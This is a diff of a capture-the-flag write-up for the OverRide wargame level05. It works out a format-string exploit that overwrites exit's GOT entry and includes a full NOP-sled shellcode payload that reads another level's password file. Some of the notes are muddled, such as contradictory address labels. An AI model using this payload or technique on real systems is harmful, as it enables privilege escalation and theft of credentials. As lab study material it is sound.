@@ -1,59 +1,31 @@
-level05@OverRide:~$ objdump -R level05
-
-level05:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-080497c4 R_386_GLOB_DAT    __gmon_start__
-080497f0 R_386_COPY        stdin
-080497d4 R_386_JUMP_SLOT   printf             # Probably vuln
-080497d8 R_386_JUMP_SLOT   fgets
-080497dc R_386_JUMP_SLOT   __gmon_start__
-080497e0 R_386_JUMP_SLOT   exit
-080497e4 R_386_JUMP_SLOT   __libc_start_main
-
 # We test
 > python -c 'print "AAAA"' | ./level05    # So the program lower case what we input
 aaaa
 
-> python -c 'print "aaaa%x " * 50' | ./level05
-aaaa64 aaaaf7fcfac0 aaaaf7ec3af9 aaaaffffd6bf aaaaffffd6be aaaa0 aaaaffffffff aaaaffffd744 aaaaf7fdb000 aaaa61616161 aaaa61207825 aaaa25616161 # Ok
+We read decompiled code, we find a printf we might be able to exploit.
 
-> python -c 'print "aaaabbbbcccc %10$x %11$x %12$x"' | ./level05
-aaaabbbbcccc 61616161 62626262 63636363
 
-# Following the exec, I think to prog loop and check uppercase and loop to lower them btw
- 804844c:	81 ec 90 00 00 00    	sub    $0x90,%esp             # 0x90: 144
- 
- 8048466:	c7 44 24 04 64 00 00 	movl   $0x64,0x4(%esp)        # 0x64: 100
- 804846e:	8d 44 24 28          	lea    0x28(%esp),%eax        # 0x28: 40
- 8048472:	89 04 24             	mov    %eax,(%esp)
- 8048475:	e8 d6 fe ff ff       	call   8048350 <fgets@plt>.
+level05@OverRide:~$ python -c 'print "aaaa"+"%p " * 15' | ./level05
+aaaa0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
+# printf the arg place is 10
 
 # Let's break the printf, the idea is to override the GOT of exit with the addresse of an env variable containing shellcode
-
-# So we need 080497e0 R_386_JUMP_SLOT   exit < 0x080497e0 and a shellcode adrress (level04) < 0xffffd884
-# From what we know from the printf the arg place is 10 and up by one each 4 char
-
-# man3 printf
-- n      The number of characters written so far is stored into the
-              integer pointed to by the corresponding argument.  That
-              argument shall be an int *, or variant whose size matches
-              the (optionally) supplied integer length modifier.
-
-# Now we need to build our exploit
-[adrr_exit][%adrrs_shellcoded%10$n]
 
 # Don't forget the NOP sled
 > export SHELLCODE=$`python -c "print '\x90' * 128 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'"`
 
-# BUT BUT BUT BUT As we can see, the format we use is %d witch take an int, if whe convert 0xffffd884 to 4294957188 and this value is > int_max, so
+# So we need 080497e0 R_386_JUMP_SLOT   exit < 0x080497e0 and a shellcode adrress (level04) < 0xffffd884 --> our shellcode is stored in ENV as in level04
+
+# Now we need to build our exploit
+[adrr_exit][%adrrs_shellcoded%10$n]
+
+
+# BUT BUT BUT BUT As we can see, the format we use is %d witch take an int, if whe convert 0xffffd884 --> adress of exit in got, to int = 4294957188 and this value is > int_max, so
 it won't work if use like that
 
 # one method whe can use is to spilt in 2 our address and write 2 bits by 2 bits, so now if we convert our adress 0xffff = 65535 | d884 = 55299
-Now we have 2 value to write 55428 and 65535-55299 = 10236, we need addr_exit and addr_exit+2, so 2+2=4
-65535-55299
-10236
+Now we have 2 value to write 55299 and 65535-55299 = 10236, we need addr_exit and addr_exit+2, so 2+2=4
+
 
 # Now we need to build our exploit again
 [adrr_exit][adrr_exit+2][%adrrs_sh%10\$hn][%ellcoded%11\$hn] #n become hn (we use short)
